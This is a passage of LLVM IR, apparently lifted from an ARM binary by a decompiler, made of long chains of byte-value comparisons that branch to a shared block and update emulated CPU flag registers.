  store i1 %v7_eacc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eacc, label %bb1408, label %dec_label_pc_eadc

bb1408:                                           ; preds = %dec_label_pc_eac0
  %v2_eac0 = icmp ugt i32 %v1_e8d4, 151
  store i1 %v2_eac0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eac0, label %dec_label_pc_e8d0, label %dec_label_pc_eadc

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eac0, %bb1408
  %v2_eadc = icmp ugt i32 %v1_e8e8, 228
  store i1 %v2_eadc, i1* %cpsr_c.global-to-local, align 1
  %v7_eadc = icmp eq i32 %v1_e8e8, 229
  %.1986 = zext i1 %v7_eadc to i32
  store i32 %.1986, i32* %r3.global-to-local, align 4
  %v2_eae8 = and i32 %.1986, %.1985
  %v4_eae8 = icmp eq i32 %v2_eae8, 0
  store i1 %v4_eae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eae8, label %dec_label_pc_eaf4, label %dec_label_pc_e8d0

dec_label_pc_eaf4:                                ; preds = %dec_label_pc_eadc
  %v7_eaf4 = icmp eq i32 %v1_e8d4, 157
  %.1987 = zext i1 %v7_eaf4 to i32
  %v2_eb00 = icmp ugt i32 %v1_e8e8, 201
  store i1 %v2_eb00, i1* %cpsr_c.global-to-local, align 1
  %v7_eb00 = icmp eq i32 %v1_e8e8, 202
  %storemerge1217 = zext i1 %v7_eb00 to i32
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  %v2_eb0c = and i32 %storemerge1217, %.1987
  %v4_eb0c = icmp eq i32 %v2_eb0c, 0
  store i1 %v4_eb0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eb0c, label %dec_label_pc_eb1c, label %dec_label_pc_e8d0

dec_label_pc_eb1c:                                ; preds = %dec_label_pc_eaf4
  store i32 %.1987, i32* %r3.global-to-local, align 4
  %v2_eb20 = icmp ugt i32 %v1_e8e8, 216
  store i1 %v2_eb20, i1* %cpsr_c.global-to-local, align 1
  %v7_eb20 = icmp eq i32 %v1_e8e8, 217
  store i1 %v7_eb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb20, label %.thread60, label %.thread61

.thread61:                                        ; preds = %dec_label_pc_eb1c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eb34

.thread60:                                        ; preds = %dec_label_pc_eb1c
  store i32 %.1987, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb2c = icmp eq i1 %v7_eaf4, false
  store i1 %v2_eb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb2c, label %dec_label_pc_eb34, label %dec_label_pc_e8d0

dec_label_pc_eb34:                                ; preds = %.thread61, %.thread60
  %v2_eb34 = icmp ugt i32 %v1_e8d4, 160
  store i1 %v2_eb34, i1* %cpsr_c.global-to-local, align 1
  %v7_eb34 = icmp eq i32 %v1_e8d4, 161
  store i1 %v7_eb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb34, label %bb1415, label %dec_label_pc_eb40

bb1415:                                           ; preds = %dec_label_pc_eb34
  %v3_eb38 = icmp ugt i32 %v1_e8e8, 123
  store i1 %v3_eb38, i1* %cpsr_c.global-to-local, align 1
  %v8_eb38 = icmp eq i32 %v1_e8e8, 124
  store i1 %v8_eb38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eb38, label %dec_label_pc_e8d0, label %dec_label_pc_eb40

dec_label_pc_eb40:                                ; preds = %dec_label_pc_eb34, %bb1415
  %v7_eb40 = icmp eq i32 %v1_e8d4, 162
  %.1988 = zext i1 %v7_eb40 to i32
  %v2_eb4c = icmp ugt i32 %v1_e8e8, 31
  store i1 %v2_eb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb4c = icmp eq i32 %v1_e8e8, 32
  %storemerge1219 = zext i1 %v7_eb4c to i32
  store i32 %storemerge1219, i32* %r3.global-to-local, align 4
  %v2_eb58 = and i32 %storemerge1219, %.1988
  %v4_eb58 = icmp eq i32 %v2_eb58, 0
  store i1 %v4_eb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eb58, label %dec_label_pc_eb68, label %dec_label_pc_e8d0

dec_label_pc_eb68:                                ; preds = %dec_label_pc_eb40
  %v7_eb68 = icmp eq i32 %v1_e8d4, 155
  %.1989 = zext i1 %v7_eb68 to i32
  %v2_eb74 = icmp ugt i32 %v1_e8e8, 95
  store i1 %v2_eb74, i1* %cpsr_c.global-to-local, align 1
  %v7_eb74 = icmp eq i32 %v1_e8e8, 96
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb74, label %bb1422, label %dec_label_pc_eb84

bb1422:                                           ; preds = %dec_label_pc_eb68
  %v2_eb68 = icmp ugt i32 %v1_e8d4, 154
  store i1 %v2_eb68, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb68, label %dec_label_pc_e8d0, label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb68, %bb1422
  %v2_eb84 = and i32 %.1983, %.1989
  %v4_eb84 = icmp eq i32 %v2_eb84, 0
  store i1 %v4_eb84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_eb84, label %dec_label_pc_eb8c, label %dec_label_pc_e8d0

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb84
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_eb90 = icmp ugt i32 %v1_e8e8, 154
  store i1 %v2_eb90, i1* %cpsr_c.global-to-local, align 1
  %v7_eb90 = icmp eq i32 %v1_e8e8, 155
  store i1 %v7_eb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb90, label %.thread71, label %.thread72

.thread72:                                        ; preds = %dec_label_pc_eb8c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eba4

.thread71:                                        ; preds = %dec_label_pc_eb8c
  store i32 %.1989, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb9c = icmp eq i1 %v7_eb68, false
  store i1 %v2_eb9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb9c, label %dec_label_pc_eba4, label %dec_label_pc_e8d0

dec_label_pc_eba4:                                ; preds = %.thread72, %.thread71
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_eba8 = icmp ugt i32 %v1_e8e8, 177
  store i1 %v2_eba8, i1* %cpsr_c.global-to-local, align 1
  %v7_eba8 = icmp eq i32 %v1_e8e8, 178
  store i1 %v7_eba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eba8, label %.thread75, label %.thread76

.thread76:                                        ; preds = %dec_label_pc_eba4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ebbc

.thread75:                                        ; preds = %dec_label_pc_eba4
  store i32 %.1989, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebb4 = icmp eq i1 %v7_eb68, false
  store i1 %v2_ebb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebb4, label %dec_label_pc_ebbc, label %dec_label_pc_e8d0

dec_label_pc_ebbc:                                ; preds = %.thread76, %.thread75
  %v7_ebbc = icmp eq i32 %v1_e8d4, 164
  %.1990 = zext i1 %v7_ebbc to i32
  %v2_ebc8 = icmp ugt i32 %v1_e8e8, 157
  store i1 %v2_ebc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebc8 = icmp eq i32 %v1_e8e8, 158
  store i1 %v7_ebc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebc8, label %bb1425, label %dec_label_pc_ebd8

bb1425:                                           ; preds = %dec_label_pc_ebbc
  %v2_ebbc = icmp ugt i32 %v1_e8d4, 163
  store i1 %v2_ebbc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebbc, label %dec_label_pc_e8d0, label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebbc, %bb1425
  %v2_ebd8 = icmp ugt i32 %v1_e8d4, 155
  store i1 %v2_ebd8, i1* %cpsr_c.global-to-local, align 1
  %v7_ebd8 = icmp eq i32 %v1_e8d4, 156
  store i1 %v7_ebd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebd8, label %bb1426, label %dec_label_pc_ebe4

bb1426:                                           ; preds = %dec_label_pc_ebd8
  %v3_ebdc = icmp ugt i32 %v1_e8e8, 8
  store i1 %v3_ebdc, i1* %cpsr_c.global-to-local, align 1
  %v8_ebdc = icmp eq i32 %v1_e8e8, 9
  store i1 %v8_ebdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ebdc, label %dec_label_pc_e8d0, label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebd8, %bb1426
  %v7_ebe4 = icmp eq i32 %v1_e8d4, 167
  %.1991 = zext i1 %v7_ebe4 to i32
  store i32 %.1991, i32* %r3.global-to-local, align 4
  %v2_ebf0 = icmp ugt i32 %v1_e8e8, 43
  store i1 %v2_ebf0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebf0 = icmp eq i32 %v1_e8e8, 44
  store i1 %v7_ebf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf0, label %bb1429, label %dec_label_pc_ec00

bb1429:                                           ; preds = %dec_label_pc_ebe4
  %v2_ebe4 = icmp ugt i32 %v1_e8d4, 166
  store i1 %v2_ebe4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe4, label %dec_label_pc_e8d0, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebe4, %bb1429
  %v2_ec00 = icmp ugt i32 %v1_e8e8, 67
  %v7_ec00 = icmp eq i32 %v1_e8e8, 68
  %.1992 = zext i1 %v7_ec00 to i32
  %v2_ec0c = icmp ugt i32 %v1_e8d4, 167
  store i1 %v2_ec0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec0c = icmp eq i32 %v1_e8d4, 168
  %storemerge1224 = zext i1 %v7_ec0c to i32
  store i32 %storemerge1224, i32* %r3.global-to-local, align 4
  %v2_ec18 = and i32 %.1992, %storemerge1224
  %v4_ec18 = icmp eq i32 %v2_ec18, 0
  store i1 %v4_ec18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ec18, label %dec_label_pc_ec24, label %dec_label_pc_e8d0

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ec00
  %v2_ec24 = icmp ugt i32 %v1_e8e8, 84
  store i1 %v2_ec24, i1* %cpsr_c.global-to-local, align 1
  %v7_ec24 = icmp eq i32 %v1_e8e8, 85
  %.1993 = zext i1 %v7_ec24 to i32
  %v2_ec30 = and i32 %.1993, %storemerge1224
  %v4_ec30 = icmp eq i32 %v2_ec30, 0
  store i1 %v4_ec30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ec30, label %dec_label_pc_ec3c, label %dec_label_pc_e8d0

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec24
  %v2_ec3c = icmp ugt i32 %v1_e8e8, 101
  store i1 %v2_ec3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec3c = icmp eq i32 %v1_e8e8, 102
  store i1 %v7_ec3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec3c, label %.thread91, label %.thread92

.thread92:                                        ; preds = %dec_label_pc_ec3c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec50

.thread91:                                        ; preds = %dec_label_pc_ec3c
  store i32 %storemerge1224, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec48 = icmp eq i1 %v7_ec0c, false
  store i1 %v2_ec48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec48, label %dec_label_pc_ec50, label %dec_label_pc_e8d0

dec_label_pc_ec50:                                ; preds = %.thread92, %.thread91
  %v2_ec50 = icmp ugt i32 %v1_e8e8, 58
  %v7_ec50 = icmp eq i32 %v1_e8e8, 59
  %.1994 = zext i1 %v7_ec50 to i32
  store i32 %.1994, i32* %r3.global-to-local, align 4
  %v2_ec5c = icmp ugt i32 %v1_e8d4, 202
  store i1 %v2_ec5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec5c = icmp eq i32 %v1_e8d4, 203
  store i1 %v7_ec5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec5c, label %bb1438, label %dec_label_pc_ec6c

bb1438:                                           ; preds = %dec_label_pc_ec50
  store i1 %v2_ec50, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec50, label %dec_label_pc_e8d0, label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec50, %bb1438
  %v2_ec6c = icmp ugt i32 %v1_e8e8, 33
  %v7_ec6c = icmp eq i32 %v1_e8e8, 34
  %.1995 = zext i1 %v7_ec6c to i32
  %v2_ec78 = icmp ugt i32 %v1_e8d4, 203
  store i1 %v2_ec78, i1* %cpsr_c.global-to-local, align 1
  %v7_ec78 = icmp eq i32 %v1_e8d4, 204
  store i1 %v7_ec78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec78, label %bb1441, label %dec_label_pc_ec88

bb1441:                                           ; preds = %dec_label_pc_ec6c
  store i1 %v2_ec6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec6c, label %dec_label_pc_e8d0, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec6c, %bb1441
  %v7_ec88 = icmp eq i32 %v1_e8d4, 207
  %.1996 = zext i1 %v7_ec88 to i32
  %v2_ec94 = icmp ugt i32 %v1_e8e8, 29
  store i1 %v2_ec94, i1* %cpsr_c.global-to-local, align 1
  %v7_ec94 = icmp eq i32 %v1_e8e8, 30
  store i1 %v7_ec94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec94, label %bb1444, label %dec_label_pc_eca4

bb1444:                                           ; preds = %dec_label_pc_ec88
  %v2_ec88 = icmp ugt i32 %v1_e8d4, 206
  store i1 %v2_ec88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec88, label %dec_label_pc_e8d0, label %dec_label_pc_eca4

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec88, %bb1444
  %v7_eca4 = icmp eq i32 %v1_e8e8, 55
  %.1997 = zext i1 %v7_eca4 to i32
  %v2_ecb0 = icmp ugt i32 %v1_e8d4, 116
  store i1 %v2_ecb0, i1* %cpsr_c.global-to-local, align 1
  %v7_ecb0 = icmp eq i32 %v1_e8d4, 117
  %storemerge1230 = zext i1 %v7_ecb0 to i32
  store i32 %storemerge1230, i32* %r3.global-to-local, align 4
  %v2_ecbc = and i32 %.1997, %storemerge1230
  %v4_ecbc = icmp eq i32 %v2_ecbc, 0
  store i1 %v4_ecbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ecbc, label %dec_label_pc_ecc8, label %dec_label_pc_e8d0

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_eca4
  %v2_ecc8 = icmp ugt i32 %v1_e8e8, 55
  store i1 %v2_ecc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ecc8 = icmp eq i32 %v1_e8e8, 56
  %.1998 = zext i1 %v7_ecc8 to i32
  %v2_ecd4 = and i32 %.1998, %storemerge1230
  %v4_ecd4 = icmp eq i32 %v2_ecd4, 0
  store i1 %v4_ecd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ecd4, label %dec_label_pc_ece0, label %dec_label_pc_e8d0

dec_label_pc_ece0:                                ; preds = %dec_label_pc_ecc8
  %v7_ece0 = icmp eq i32 %v1_e8d4, 80
  %.1999 = zext i1 %v7_ece0 to i32
  store i32 %.1999, i32* %r3.global-to-local, align 4
  %v2_ecec = icmp ugt i32 %v1_e8e8, 234
  store i1 %v2_ecec, i1* %cpsr_c.global-to-local, align 1
  %v7_ecec = icmp eq i32 %v1_e8e8, 235
  store i1 %v7_ecec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ecec, label %bb1453, label %dec_label_pc_ecfc

bb1453:                                           ; preds = %dec_label_pc_ece0
  %v2_ece0 = icmp ugt i32 %v1_e8d4, 79
  store i1 %v2_ece0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ece0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ece0, label %dec_label_pc_e8d0, label %dec_label_pc_ecfc

dec_label_pc_ecfc:                                ; preds = %dec_label_pc_ece0, %bb1453
  store i32 %.1996, i32* %r3.global-to-local, align 4
  %v2_ed00 = icmp ugt i32 %v1_e8e8, 119
  store i1 %v2_ed00, i1* %cpsr_c.global-to-local, align 1
  %v7_ed00 = icmp eq i32 %v1_e8e8, 120
  store i1 %v7_ed00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed00, label %.thread114, label %.thread115

.thread115:                                       ; preds = %dec_label_pc_ecfc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed14

.thread114:                                       ; preds = %dec_label_pc_ecfc
  store i32 %.1996, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed0c = icmp eq i1 %v7_ec88, false
  store i1 %v2_ed0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed0c, label %dec_label_pc_ed14, label %dec_label_pc_e8d0

dec_label_pc_ed14:                                ; preds = %.thread115, %.thread114
  %v7_ed14 = icmp eq i32 %v1_e8d4, 209
  %.2000 = zext i1 %v7_ed14 to i32
  %v2_ed20 = icmp ugt i32 %v1_e8e8, 34
  store i1 %v2_ed20, i1* %cpsr_c.global-to-local, align 1
  %v7_ed20 = icmp eq i32 %v1_e8e8, 35
  store i1 %v7_ed20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed20, label %bb1456, label %dec_label_pc_ed30

bb1456:                                           ; preds = %dec_label_pc_ed14
  %v2_ed14 = icmp ugt i32 %v1_e8d4, 208
  store i1 %v2_ed14, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed14, label %dec_label_pc_e8d0, label %dec_label_pc_ed30

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ed14, %bb1456
  %v7_ed30 = icmp eq i32 %v1_e8d4, 64
  %.2001 = zext i1 %v7_ed30 to i32
  %v2_ed3c = icmp ugt i32 %v1_e8e8, 69
  store i1 %v2_ed3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c = icmp eq i32 %v1_e8e8, 70
  store i1 %v7_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c, label %bb1459, label %dec_label_pc_ed4c

bb1459:                                           ; preds = %dec_label_pc_ed30
  %v2_ed30 = icmp ugt i32 %v1_e8d4, 63
  store i1 %v2_ed30, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ed30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed30, label %dec_label_pc_e8d0, label %dec_label_pc_ed4c

dec_label_pc_ed4c:                                ; preds = %dec_label_pc_ed30, %bb1459
  %v7_ed4c = icmp eq i32 %v1_e8d4, 172
  %.2002 = zext i1 %v7_ed4c to i32
  store i32 %.2002, i32* %r3.global-to-local, align 4
  %v2_ed58 = icmp ugt i32 %v1_e8e8, 14
  store i1 %v2_ed58, i1* %cpsr_c.global-to-local, align 1
  %v7_ed58 = icmp eq i32 %v1_e8e8, 15
  store i1 %v7_ed58, i1* %cpsr_z.global-to-local, align 1
  %v2_ed5c = xor i1 %v2_ed58, true
  %v3_ed5c = or i1 %v7_ed58, %v2_ed5c
  br i1 %v3_ed5c, label %bb1462, label %bb1463

bb1462:                                           ; preds = %dec_label_pc_ed4c
  br label %bb1463

bb1463:                                           ; preds = %dec_label_pc_ed4c, %bb1462
  %v1_ed64825 = phi i32 [ %.2000, %dec_label_pc_ed4c ], [ 0, %bb1462 ]
  %v2_ed60 = xor i1 %v7_ed58, true
  %v3_ed60 = and i1 %v2_ed58, %v2_ed60
  br i1 %v3_ed60, label %bb1464, label %bb1465

bb1464:                                           ; preds = %bb1463
  br label %bb1465

bb1465:                                           ; preds = %bb1463, %bb1464
  %v0_f338 = phi i32 [ %v1_ed64825, %bb1463 ], [ 1, %bb1464 ]
  %v2_ed64 = and i32 %v0_f338, %.2002
  %v4_ed64 = icmp eq i32 %v2_ed64, 0
  store i1 %v4_ed64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ed64, label %dec_label_pc_ed7c, label %dec_label_pc_ed74

dec_label_pc_ed74:                                ; preds = %bb1465
  %v2_ed74 = icmp ugt i32 %v1_e8e8, 30
  store i1 %v2_ed74, i1* %cpsr_c.global-to-local, align 1
  %v7_ed74 = icmp eq i32 %v1_e8e8, 31
  store i1 %v7_ed74, i1* %cpsr_z.global-to-local, align 1
  %v2_ed78 = xor i1 %v2_ed74, true
  %v3_ed78 = or i1 %v7_ed74, %v2_ed78
  br i1 %v3_ed78, label %dec_label_pc_e8d0, label %dec_label_pc_ed7c

dec_label_pc_ed7c:                                ; preds = %dec_label_pc_ed74, %bb1465
  %v2_ed7c = icmp ugt i32 %v1_e8e8, 62
  store i1 %v2_ed7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed7c = icmp eq i32 %v1_e8e8, 63
  store i1 %v7_ed7c, i1* %cpsr_z.global-to-local, align 1
  %v2_ed80 = xor i1 %v2_ed7c, true
  %v3_ed80 = or i1 %v7_ed7c, %v2_ed80
  br i1 %v3_ed80, label %bb1466, label %bb1467

bb1466:                                           ; preds = %dec_label_pc_ed7c
  br label %bb1467

bb1467:                                           ; preds = %dec_label_pc_ed7c, %bb1466
  %v0_ed88827 = phi i32 [ %.2001, %dec_label_pc_ed7c ], [ 0, %bb1466 ]
  %v2_ed84 = xor i1 %v7_ed7c, true
  %v3_ed84 = and i1 %v2_ed7c, %v2_ed84
  br i1 %v3_ed84, label %bb1468, label %bb1469

bb1468:                                           ; preds = %bb1467
  br label %bb1469

bb1469:                                           ; preds = %bb1467, %bb1468
  %v0_ff84 = phi i32 [ %v0_ed88827, %bb1467 ], [ 1, %bb1468 ]
  store i32 %v0_ff84, i32* %r3.global-to-local, align 4
  %v2_ed8c = icmp ugt i32 %v1_e8d4, 99
  store i1 %v2_ed8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed8c = icmp eq i32 %v1_e8d4, 100
  store i1 %v7_ed8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed8c, label %bb1470, label %.thread1149

.thread1149:                                      ; preds = %bb1469
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_edac

bb1470:                                           ; preds = %bb1469
  %v2_ed94 = urem i32 %v0_ff84, 2
  store i32 %v2_ed94, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed98 = icmp eq i32 %v2_ed94, 0
  store i1 %v2_ed98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed98, label %dec_label_pc_edac, label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %bb1470
  %v2_eda4 = icmp ugt i32 %v1_e8e8, 125
  store i1 %v2_eda4, i1* %cpsr_c.global-to-local, align 1
  %v7_eda4 = icmp eq i32 %v1_e8e8, 126
  store i1 %v7_eda4, i1* %cpsr_z.global-to-local, align 1
  %v2_eda8 = xor i1 %v2_eda4, true
  %v3_eda8 = or i1 %v7_eda4, %v2_eda8
  br i1 %v3_eda8, label %dec_label_pc_e8d0, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %.thread1149, %dec_label_pc_eda4, %bb1470
  %v7_edac = icmp eq i32 %v1_e8d4, 169
  %.2003 = zext i1 %v7_edac to i32
  store i32 %.2003, i32* %r3.global-to-local, align 4
  %v2_edb8 = icmp ugt i32 %v1_e8e8, 253
  store i1 %v2_edb8, i1* %cpsr_c.global-to-local, align 1
  %v7_edb8 = icmp eq i32 %v1_e8e8, 254
  %storemerge1237 = zext i1 %v7_edb8 to i32
  %v2_edc4 = and i32 %storemerge1237, %.2003
  %v4_edc4 = icmp eq i32 %v2_edc4, 0
  store i1 %v4_edc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_edc4, label %dec_label_pc_edd4, label %dec_label_pc_e8d0

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edac
  %v7_edd4 = icmp eq i32 %v1_e8d4, 198
  %.2004 = zext i1 %v7_edd4 to i32
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 %v2_e99c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e99c, i1* %cpsr_z.global-to-local, align 1
  %v2_ede8 = xor i1 %v2_e99c, true
  %v3_ede8 = or i1 %v7_e99c, %v2_ede8
  br i1 %v3_ede8, label %bb1477, label %bb1478

bb1477:                                           ; preds = %dec_label_pc_edd4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1478

bb1478:                                           ; preds = %dec_label_pc_edd4, %bb1477
  %v4_edec = phi i32 [ %.2004, %dec_label_pc_edd4 ], [ 0, %bb1477 ]
  %v2_edec = xor i1 %v7_e99c, true
  %v3_edec = and i1 %v2_e99c, %v2_edec
  br i1 %v3_edec, label %bb1479, label %thread-pre-split131

bb1479:                                           ; preds = %bb1478
  store i32 %v4_edec, i32* %r3.global-to-local, align 4
  br label %thread-pre-split131

thread-pre-split131:                              ; preds = %bb1478, %bb1479
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edf0 = icmp eq i32 %v4_edec, 0
  store i1 %v2_edf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edf0, label %dec_label_pc_ee04, label %dec_label_pc_edfc

dec_label_pc_edfc:                                ; preds = %thread-pre-split131
  %v2_edfc = icmp ugt i32 %v1_e8e8, 18
  store i1 %v2_edfc, i1* %cpsr_c.global-to-local, align 1
  %v7_edfc = icmp eq i32 %v1_e8e8, 19
  store i1 %v7_edfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ee00 = xor i1 %v2_edfc, true
  %v3_ee00 = or i1 %v7_edfc, %v2_ee00
  br i1 %v3_ee00, label %dec_label_pc_e8d0, label %dec_label_pc_ee04

dec_label_pc_ee04:                                ; preds = %dec_label_pc_edfc, %thread-pre-split131
  store i32 %.2001, i32* %r3.global-to-local, align 4
  store i1 %v2_ec00, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec00, i1* %cpsr_z.global-to-local, align 1
  %v2_ee0c = xor i1 %v2_ec00, true
  %v3_ee0c = or i1 %v7_ec00, %v2_ee0c
  br i1 %v3_ee0c, label %bb1480, label %bb1481

bb1480:                                           ; preds = %dec_label_pc_ee04
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1481

bb1481:                                           ; preds = %dec_label_pc_ee04, %bb1480
  %v4_ee10 = phi i32 [ %.2001, %dec_label_pc_ee04 ], [ 0, %bb1480 ]
  %v2_ee10 = xor i1 %v7_ec00, true
  %v3_ee10 = and i1 %v2_ec00, %v2_ee10
  br i1 %v3_ee10, label %bb1482, label %thread-pre-split132

bb1482:                                           ; preds = %bb1481
  store i32 %v4_ee10, i32* %r3.global-to-local, align 4
  br label %thread-pre-split132

thread-pre-split132:                              ; preds = %bb1481, %bb1482
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee14 = icmp eq i32 %v4_ee10, 0
  store i1 %v2_ee14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee14, label %dec_label_pc_ee24, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %thread-pre-split132
  %v2_ee1c = icmp ugt i32 %v1_e8e8, 225
  store i1 %v2_ee1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee1c = icmp eq i32 %v1_e8e8, 226
  store i1 %v7_ee1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee20 = xor i1 %v2_ee1c, true
  %v3_ee20 = or i1 %v7_ee1c, %v2_ee20
  br i1 %v3_ee20, label %dec_label_pc_e8d0, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ee1c, %thread-pre-split132
  store i1 %v2_ec6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec6c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee28 = xor i1 %v2_ec6c, true
  %v3_ee28 = or i1 %v7_ec6c, %v2_ee28
  br i1 %v3_ee28, label %bb1483, label %bb1484

bb1483:                                           ; preds = %dec_label_pc_ee24
  store i32 0, i32* %r3.global-to-local, align 4
